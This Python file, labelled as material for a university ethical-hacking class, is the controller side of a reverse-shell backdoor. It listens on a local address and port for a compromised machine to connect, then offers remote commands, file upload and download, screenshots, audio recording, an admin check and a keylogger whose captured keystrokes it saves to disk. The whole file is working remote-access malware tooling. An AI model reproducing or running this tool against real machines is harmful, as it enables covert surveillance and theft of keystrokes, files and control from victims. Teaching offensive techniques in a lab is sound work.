################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

import socket
import json
import os
from datetime import datetime

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        try:
            while True:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        target.settimeout(None)

def save_output_to_file(data, prefix):
    now = datetime.now().strftime('%Y%m%d-%H%M%S')
    filename = f"{prefix}_{now}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(data)
    print(f"[+] Saved output to {filename}")

def print_help():
    print("""
Available Commands:
  quit                 - Exit the shell
  clear                - Clear terminal screen
  cd <dir>             - Change directory on target
  upload <file>        - Upload file to target
  download <file>      - Download file from target
  screenshot           - Capture screenshot (auto-downloads 'screen.png')
  record_audio         - Record 5 seconds of audio (auto-downloads 'audio.wav')
  check_admin          - Check if target has admin privileges
  keylog_start         - Start keylogger (logs will appear automatically)
  help                 - Show this help menu
""")

def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        if command == '':
            continue
        elif command == 'help':
            print_help()
            continue

        reliable_send(command)

        if command == 'quit':
            break
        elif command == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
        elif command.startswith('cd '):
            # No response expected
            pass
        elif command.startswith('download'):
            filename = command[9:]
            download_file(filename)
            print(f"[+] File '{filename}' downloaded.")
        elif command.startswith('upload'):
            filename = command[7:]
            if os.path.exists(filename):
                upload_file(filename)
                print(f"[+] File '{filename}' uploaded.")
            else:
                print(f"[-] File '{filename}' not found.")
        elif command == 'screenshot':
            download_file("screen.png")
            print("[+] Screenshot downloaded as 'screen.png'")
        elif command == 'record_audio':
            download_file("audio.wav")
            print("[+] Audio downloaded as 'audio.wav'")
        else:
            result = reliable_recv()
            print(result)

            # Optionally auto-save keylog output
            if isinstance(result, str) and result.startswith("[KEYLOG]"):
                save_output_to_file(result, "keylog")

# Create and bind socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.12', 5555))
sock.listen(5)

print('[+] Listening For The Incoming Connections...')
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

target_communication()
